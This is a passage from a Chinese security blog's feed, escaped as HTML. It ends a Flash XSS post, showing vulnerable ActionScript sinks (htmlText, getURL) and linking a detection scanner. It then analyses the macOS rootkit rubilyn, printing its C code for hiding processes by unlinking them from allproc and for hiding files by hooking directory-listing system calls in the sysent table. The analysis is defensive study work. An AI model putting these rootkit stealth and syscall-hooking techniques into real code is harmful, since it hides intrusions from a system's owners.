&lt;h3 id=&quot;漏洞六&quot;&gt;&lt;a href=&quot;#漏洞六&quot; class=&quot;headerlink&quot; title=&quot;漏洞六&quot;&gt;&lt;/a&gt;漏洞六&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.textField.htmlText = [&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, content, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;].join(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;_global.sIFR = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(textField, content)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;  ……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	   &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.write(content);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  	   ……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     sIFR.instance = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; sIFR(_loc3.txtF, _loc4);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     _loc4 = sIFR.VERSION_WARNING.split(&lt;span class=&quot;string&quot;&gt;&quot;%s&quot;&lt;/span&gt;).join(_root.version);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞七&quot;&gt;&lt;a href=&quot;#漏洞七&quot; class=&quot;headerlink&quot; title=&quot;漏洞七&quot;&gt;&lt;/a&gt;漏洞七&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._setVar(&lt;span class=&quot;string&quot;&gt;&quot;_onClick&quot;&lt;/span&gt;, [_root.onclick, pConfig.onclick], &lt;span class=&quot;string&quot;&gt;&quot;String&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;getURL(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._onClick, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._onClickTarget);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;自动化检测脚本&quot;&gt;&lt;a href=&quot;#自动化检测脚本&quot; class=&quot;headerlink&quot; title=&quot;自动化检测脚本&quot;&gt;&lt;/a&gt;自动化检测脚本&lt;/h3&gt;&lt;p&gt;顺手写了个简单的检测已知漏洞的flash xss检测脚本，下载地址见 &lt;a href=&quot;https://github.com/riusksk/FlashScanner&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FlashScanner&lt;/a&gt;：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/flash_xss/checker.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/center&gt;


</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;漏洞一&quot;&gt;&lt;a href=&quot;#漏洞一&quot; class=&quot;headerlink&quot; title=&quot;漏洞一&quot;&gt;&lt;/a&gt;漏洞一&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Flash" scheme="http://riusksk.github.io/tags/Flash/"/>
    
      <category term="XSS" scheme="http://riusksk.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX rootkit rubilyn 源码分析</title>
    <link href="http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/"/>
    <id>http://riusksk.github.io/2013/01/01/osx_rootkit_rubilyn_analyze/</id>
    <published>2012-12-31T16:00:00.000Z</published>
    <updated>2016-06-22T05:17:56.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* modify allproc to hide a specific pid */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hideproc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (p = my_allproc-&amp;gt;lh_first; p != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; p = p-&amp;gt;p_list.le_next) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid == p-&amp;gt;p_pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(hidden_p_count &amp;lt; MAX_HIDDEN_PROCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p[hidden_p_count]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p_count++;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_lock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    LIST_REMOVE(p, p_list); 	&lt;span class=&quot;comment&quot;&gt;// 移除p_list结构中关于p进程的元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_unlock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;2、隐藏文件&quot;&gt;&lt;a href=&quot;#2、隐藏文件&quot; class=&quot;headerlink&quot; title=&quot;2、隐藏文件&quot;&gt;&lt;/a&gt;2、隐藏文件&lt;/h3&gt;&lt;p&gt;为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：&lt;/p&gt;
&lt;figure class=&quot;highlight d&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk&lt;span class=&quot;keyword&quot;&gt;@macosx&lt;/span&gt;:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::entry&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pid$target:::&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   printf(&lt;span class=&quot;string&quot;&gt;&quot;=%d\n&quot;&lt;/span&gt;, arg1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是查看finder进程2841的调用函数：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p 2841 | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &#39;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&#39; matched 573227 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1078881          getdirentriesattr:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 1363229         getdirentriesattr:return =1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是ls命令(64位系统)调用的函数：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: script &amp;apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&amp;apos; matched 28745 probes&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dtrace: pid 3184 has exited&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =1980&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 271609          __getdirentries64:entry &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  2 285894         __getdirentries64:return =0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sysent &amp;#123; &lt;span class=&quot;comment&quot;&gt;/* system call table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int16_t&lt;/span&gt; sy_narg; &lt;span class=&quot;comment&quot;&gt;/* number of args */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_resv; &lt;span class=&quot;comment&quot;&gt;/* reserved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt; sy_flags; &lt;span class=&quot;comment&quot;&gt;/* flags */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_call_t&lt;/span&gt; *sy_call; &lt;span class=&quot;comment&quot;&gt;/* implementing function */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge32; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 32-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;sy_munge_t&lt;/span&gt; *sy_arg_munge64; &lt;span class=&quot;comment&quot;&gt;/* system call arguments munger for 64-bit process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; sy_return_type; &lt;span class=&quot;comment&quot;&gt;/* system call return types */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; sy_arg_bytes; &lt;span class=&quot;comment&quot;&gt;/* Total size of arguments in bytes for* 32-bit system calls */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries  196&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentriesattr 222&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt;	SYS_getdirentries64 344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nsysent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    table = find_sysent();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(table)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* back up original syscall pointers */&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 	&lt;span class=&quot;comment&quot;&gt;// 保存原系统函数地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* replace syscalls in syscall table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;	&lt;span class=&quot;comment&quot;&gt;// 替换原系统函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; dirent &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint32_t&lt;/span&gt; d_fileno; 	&lt;span class=&quot;comment&quot;&gt;// 节点号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint16_t&lt;/span&gt; d_reclen;	&lt;span class=&quot;comment&quot;&gt;// 目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_type;	&lt;span class=&quot;comment&quot;&gt;// 文件类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_namlen;	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span 